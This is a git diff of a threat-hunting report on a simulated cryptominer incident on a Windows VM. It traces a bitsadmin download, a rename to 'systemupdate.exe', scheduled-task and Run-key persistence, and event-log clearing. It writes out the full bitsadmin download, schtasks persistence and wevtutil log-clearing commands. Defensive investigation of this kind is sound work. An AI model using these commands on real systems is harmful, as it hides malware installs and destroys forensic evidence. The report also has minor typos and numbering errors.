@@ -27,7 +27,7 @@ A sudden spike in CPU and memory usage was observed on a Windows 10 endpoint in 
 
 ### 1. Searched the `DeviceFileEvents` table for downloaded files
 
-Searched for any instances of cryptomining related files being downloaded onto the "cmh-cyber-vm" device and discovered that at `2025-03-09T17:34:20.1108818Z`, the user "cmh-cyber" had initiated the download of "fake-miner.exe" and moved the file to `C:\Users\cmh-cyber\AppData\Local\Temp`. At `2025-03-09T17:41:05.7333922Z`, there's evidence that the "fake-miner.exe" file had been renamed, and at `2025-03-09T19:25:56.9807673Z` there's evidence that the new filename is now "systemupdate.exe" in an attempt to bypass signature based detection methods and blend in with normal system activity.
+Searched for any instances of cryptomining related files being downloaded onto the `cmh-cyber-vm` device and discovered that at `2025-03-09T17:34:20.1108818Z`, the user `cmh-cyber` had initiated the download of `fake-miner.exe` to `C:\Users\cmh-cyber\AppData\Local\Temp`. At `2025-03-09T17:41:05.7333922Z`, there's evidence that the `fake-miner.exe` file had been renamed to `systemupdate.exe` in an attempt to bypass signature based detection methods and blend in with normal system activity.
 
 **Queries used to locate event:**
 
@@ -56,7 +56,7 @@ DeviceFileEvents
 
 ### 2. Searched the `DeviceProcessEvents` table for cryptomining activity
 
-Digging further into the `DeviceProcessEvents` table, the first thing that's observed is that the user "cmh-cyber" utilized `bitsadmin.exe` as a download method in an attempt to avoid detection and bypass any security restrictions that may have blocked the cryptominer from being downloaded in the first place. At `2025-03-09T19:27:55.2679055Z`, the user "cmh-cyber" had initiated the cryptominer by starting the `systemudpate.exe` process. The user "cmh-cyber" then continues to establish persistence through a `schtask` command that configured a schedule task to execute `systemupdate.exe` every time a logon event is encountered.
+Digging further into the `DeviceProcessEvents` table, the first thing that's observed is that the user `cmh-cyber` utilized `bitsadmin.exe` as a download method in an attempt to avoid detection and bypass any security restrictions that may have blocked the cryptominer from being downloaded in the first place. At `2025-03-09T19:27:55.2679055Z`, the user `cmh-cyber` had initiated the cryptominer by starting the `systemudpate.exe` process. The user `cmh-cyber` then continues to establish persistence through a `schtask` command that configured a schedule task to execute `systemupdate.exe` every time a logon event is encountered.
 
 **Queries used to locate events:**
 
@@ -102,9 +102,7 @@ DeviceNetworkEvents
 
 ### 4. Searched the `DeviceRegistryEvents` to check if the cryptominer had created a registry Run key or similar.
 
-The detection of a registry modification event, specifically persistence via the Run or RunOnce registry keys, was discovered 
-
-At `2025-03-10T02:11:27.0935942Z`, a RegistryValueSet event was detected on the device "cmh-cyber-vm", where the FakeMiner registry key was created under `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`. The registry value persistence mechanism points to the executable `systemupdate.exe`.
+The detection of a registry modification event (persistence via the Run or RunOnce registry keys) was detected on the device `cmh-cyber-vm` at `2025-03-10T02:11:27.0935942Z`, where the `FakeMiner` registry key was created under `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`. The registry value persistence mechanism points to the executable `systemupdate.exe`.
 
 **Query used to locate event:**
 
@@ -122,7 +120,7 @@ DeviceRegistryEvents
 
 ### 5. Searched the `DeviceProcessEvents` to find any anti-forensics activity
 
-Searching for High `ProcessIntegrityLevel` events after the registry modification event at `2025-03-10T02:11:27.0935942Z` reveals three `wevtutil` commands intiated by the user "cmh-cyber" at `2025-03-10T02:14:24.1643258Z`, `2025-03-10T02:14:32.2637847Z` and `2025-03-10T02:14:09.8833781Z` respectively which successfully cleared the Application, Security and System event logs. This behavior is associated with anti-forensic techniques used to cover tracks after unauthorized activities, such as malware execution or persistence setup.
+Searching for High `ProcessIntegrityLevel` events after the registry modification event at `2025-03-10T02:11:27.0935942Z` reveals three `wevtutil` commands intiated by the user `cmh-cyber` at `2025-03-10T02:14:24.1643258Z`, `2025-03-10T02:14:32.2637847Z` and `2025-03-10T02:14:09.8833781Z` respectively which successfully cleared the Application, Security and System event logs. This behavior is associated with anti-forensic techniques used to cover tracks after unauthorized activities, such as malware execution or persistence setup.
 
 **Query used to locate event:**
 
@@ -140,35 +138,60 @@ DeviceProcessEvents
 
 ## Chronological Events
 
-1. **Cryptominer Downloaded via bitsadmin**  
-   - Timestamp: 2025-03-09 09:14 UTC  
-   - File `fake-miner.exe` downloaded from a GitHub URL to `C:\Users\<User>\Downloads`.
+### 1. File Download - Cryptominer via bitsadmin 
+   - Timestamp: `2025-03-09T17:34:20.1108818Z`
+   - Event:  File `fake-miner.exe` downloaded from a GitHub URL to `C:\Users\cmh-cyber\`
+   - Action: File download detected.
+   - Filepath: `C:\Users\cmh-cyber\fake-miner.exe`
+   - Command: `bitsadmin  /transfer "Download" /priority normal https://github.com/clayhickman/portfolio/raw/refs/heads/main/threat-hunting-scenarios/cryptominer/fake-miner.exe "C:\Users\cmh-cyber\AppData\Local\Temp\fake-miner.exe"`
 
-2. **File Renamed and Moved**  
-   - Timestamp: 2025-03-09 09:15 UTC  
-   - `fake-miner.exe` renamed to `systemupdate.exe` and moved to `C:\Users\<User>\AppData\Local\Temp\`.
 
-3. **Execution & Scheduled Task Creation**  
-   - Timestamp: 2025-03-09 09:16 UTC  
-   - `systemupdate.exe` was executed, followed by a `schtasks.exe` command to set up a persistent run on user logon.
+### 2. File Creation - File Renamed
+   - Timestamp: `2025-03-09T17:41:05.7333922Z`
+   - Event: `fake-miner.exe` renamed to `systemupdate.exe`
+   - Action: File rename detected.
+   - Filepath: `C:\Users\cmh-cyber\systemupdate.exe`
 
-4. **High CPU Usage Observed**  
-   - Timestamp: 2025-03-09 09:20 UTC  
-   - Monitoring tools showed CPU spikes and suspicious outbound network connections to a known mining pool domain over port 4444.
+### 3. Process Execution - Cryptominer Execution and Scheduled Task Creation* 
+   - Timestamps:
+      - `2025-03-09T19:27:55.2679055Z` - `systemupdate.exe` executed.
+      - `2025-03-09T19:36:39.3797145Z` - `schtasks.exe` set up.
+   - Event: `systemupdate.exe` was executed, followed by a `schtasks.exe` command to set up persistence triggered on user logon.
+   - Action: Process execution detected.
+   - Command:  `schtasks /create /tn SystemUpdate /tr C:\Users\cmh-cyber\AppData\Local\Temp\systemupdate.exe /sc onlogon`
 
-5. **Cleanup Commands**  
-   - Timestamp: 2025-03-09 09:25 UTC  
-   - DeviceFileEvents indicated deletion of the original `fake-miner.exe` file and attempted event log clearing via `wevtutil`.
+
+### 4. Network Activity - Outbound Connection 
+   - Timestamp: `2025-03-10T02:11:48.1390195Z`
+   - Event: Outbound network connections were made to a mining pool at `192.168.1.100:3333`.
+   - Action: Connection successful.
+
+### 5. Persistence - Registery Key Modification 
+   - Timestamp: `2025-03-10T02:11:27.0935942Z`
+   - Event: A registery key modification is made to establish persistence via the Run or RunOnce Registry Keys
+   - Action: ... 
+
+### 5. Anti-Forensics - Removal of Logs
+   - Timestamps:
+      - `2025-03-10T02:14:24.1643258Z` - `Application`
+      - `2025-03-10T02:14:32.2637847Z` - `Security`
+      - `2025-03-10T02:14:09.8833781Z` - `System`
+   - Event: Event logs cleared via `wevtutil`.
+   - Action: Log deletion detected.
+   - Commands:
+     - `wevtutil cl Applcation`
+     - `wevtutil cl Security`
+     - `wevtutil cl System`
 
 ---
 
 ## Summary
-Our threat hunt confirmed an **unauthorized cryptominer** was installed and actively running. Attackers likely used **`bitsadmin.exe`** to download the miner, renamed it to “**systemupdate.exe**,” and set up persistence using Windows **Scheduled Tasks**. The miner established connections to an external mining pool, causing **elevated CPU usage** and **unusual network traffic**.
+Our threat hunt confirmed an unauthorized cryptominer was installed and actively running on the device `cmh-cyber-vm`. The user `cmh-cyber` used `bitsadmin.exe` to download the miner, renamed it to `systemupdate.exe`, and set up persistence using Windows `Scheduled Tasks`. The cryptominer established connections to an external mining pool at `192.168.1.100:3333`, causing elevated CPU usage and unusual network traffic. Once the intial set up was completed, the user `cmh-cyber` conducted a series of anti-forensic actions to cover their tracks.
 
 ---
 
 ## Response Taken
-The affected endpoint `cmh-cyber-vm` was isolated from the network to prevent further resource abuse or spread. The suspicious executable `systemupdate.exe` was quarantined and removed. Additional blocking rules and stricter policies on the use of `bitsadmin.exe` were implemented. Management was notified, and a full environment review to identify any lateral movement or secondary infections is scheduled as the next course of action.
+The affected endpoint `cmh-cyber-vm` was isolated from the network to prevent further resource abuse or spread. The suspicious executable `systemupdate.exe` was quarantined and removed. Additional blocking rules and stricter policies on the use of `bitsadmin.exe` were implemented. Management was notified, and a full environmental review to identify any lateral movement or secondary infections is recommended as the next course of action.
 
 ---
 
@@ -181,13 +204,6 @@ The affected endpoint `cmh-cyber-vm` was isolated from the network to prevent fu
 - **Reviewer Name**:  
 - **Reviewer Contact**:  
 - **Validation Date**:  
-
----
-
-## Additional Notes:
-- Cryptominers often trigger high CPU usage and can affect performance.  
-- Combining logs from **MDE** with performance metrics can help correlate usage spikes with suspicious processes.  
-- Further blocking rules on “living off the land” tools like `bitsadmin.exe` can reduce future risk.
 
 ---
 
